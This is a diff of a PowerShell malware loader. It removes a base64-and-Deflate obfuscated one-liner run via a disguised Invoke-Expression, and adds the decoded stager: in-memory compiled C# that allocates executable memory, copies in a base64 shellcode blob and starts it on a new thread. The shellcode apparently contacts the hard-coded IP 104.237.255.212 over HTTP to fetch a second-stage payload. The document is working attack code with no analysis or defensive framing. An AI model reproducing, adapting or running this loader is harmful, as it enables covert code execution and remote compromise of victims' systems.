@@ -1,1 +1,30 @@
-(new-ObJEcT SYsTem.Io.compreSsIoN.DeFlATeSTREAm( [IO.mEMoRystReam] [CONveRt]::fRoMBase64STrinG( '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'),[io.ComPreSsIon.CoMPreSSIONMOde]::dECompREss ) |%{new-ObJEcT  Io.sTreaMREADEr($_ ,[SystEM.tEXT.ENCODinG]::Ascii) }| % {$_.reADToEND() })| .( $sHEllId[1]+$ShElliD[13]+'x')
+Set-StrictMode -Version 2
+$kvCgM = @"
+        using System;
+        using System.Runtime.InteropServices;
+        namespace oi {
+                public class func {
+                        [Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
+                        [Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
+                        [Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
+                        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+                        [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+                        [DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
+                }
+        }
+"@
+
+$x_1H = New-Object Microsoft.CSharp.CSharpCodeProvider
+$mugz3 = New-Object System.CodeDom.Compiler.CompilerParameters
+$mugz3.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
+$mugz3.GenerateInMemory = $True
+$w2t = $x_1H.CompileAssemblyFromSource($mugz3, $kvCgM)
+
+[Byte[]]$aMdK8 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6BAAAAAxMDQuMjM3LjI1NS4yMTIAWkiJwUnHwLsBAABNMclTU2oDU0m6V4mfxgAAAAD/1ejOAAAAL0JUZWVSbURYeXBoNG9YbWpJMEd6QndMZ1NEM004dUNkbE92c2s1Sk5oaHlndkplREpyT1RvbUM0LW9hdkVIc3JTRWdBUEtvRnJ6SmtrYTlLbk94Z3pLbktjS3BTTF9IaWZ5aWk5M1NKODF0bTBxYndkcTdvVDBCMC04cmlkby1OR0lWcGJfU1FCak9vUlRteDlXN1ZNZU5mSkxGbkpvc2k5NF9kQVlkZzZMZll0ZDlpN3VJOGJRZmVGVEd4M3ljU1lwYkdrV0hVeTZGbgBIicFTWkFYTTHJU0i4ADKghAAAAABQU1NJx8LrVS47/9VIicZqCl9IifFqH1pSaIAzAABJieBqBEFZSbp1Rp6GAAAAAP/VTTHAU1pIifFNMclNMclTU0nHwi0GGHv/1YXAdR9Ix8GIEwAASbpE8DXgAAAAAP/VSP/PdALrquhVAAAAU1lqQFpJidHB4hBJx8AAEAAASbpYpFPlAAAAAP/VSJNTU0iJ50iJ8UiJ2knHwAAgAABJiflJuhKWieIAAAAA/9VIg8QghcB0smaLB0gBw4XAddJYw1hqAFlJx8LwtaJW/9U=")
+
+$fU = [oi.func]::VirtualAlloc(0, $aMdK8.Length + 1, [oi.func+AllocationType]::Reserve -bOr [oi.func+AllocationType]::Commit, [oi.func+MemoryProtection]::ExecuteReadWrite)
+if ([Bool]!$fU) { $global:result = 3; return }
+[System.Runtime.InteropServices.Marshal]::Copy($aMdK8, 0, $fU, $aMdK8.Length)
+[IntPtr] $zqu = [oi.func]::CreateThread(0,0,$fU,0,0,0)
+if ([Bool]!$zqu) { $global:result = 7; return }
+$ro2 = [oi.func]::WaitForSingleObject($zqu, [oi.func+Time]::Infinite)
